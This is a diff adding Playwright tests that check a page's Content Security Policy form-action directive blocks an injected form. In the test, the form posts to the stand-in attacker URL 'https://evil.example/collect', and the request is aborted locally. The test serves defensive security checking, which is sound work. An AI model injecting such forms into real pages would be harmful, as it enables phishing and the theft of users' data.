@@ -137,3 +137,25 @@ test("file:// index.html: zero CSP violations (the missing optional scripts only
   await expect(page.locator(".msg").first()).toBeVisible();
   await assertNoCspViolations(page, consoleViolations);
 });
+
+// A form is the one thing injected markup could still use under script-src
+// 'self' (a fake "session expired" form posting elsewhere): the policy says
+// no page here submits a form anywhere. The calendar's jump form is handled
+// in script (its submit is cancelled), so it never navigates and isn't affected.
+for (const page_ of ["/", "/setup.html"]) {
+  test(page_ + ": a form posting to another site is blocked by form-action", async ({ page }) => {
+    await installCspEventCollector(page);
+    await page.route("https://evil.example/**", (route) => route.abort());   // never leaves the machine either way
+    await page.addInitScript(() => { try { localStorage.setItem("gca.onboarded", "1"); } catch (e) { /* storage blocked */ } });
+    await page.goto(page_);
+    const before = page.url();
+    await page.evaluate(() => {
+      const f = document.createElement("form");
+      f.action = "https://evil.example/collect"; f.method = "post";
+      document.body.appendChild(f);
+      f.submit();
+    });
+    await expect.poll(() => page.evaluate(() => window.__cspEvents.map((e) => e.directive))).toContain("form-action");
+    expect(page.url()).toBe(before);
+  });
+}
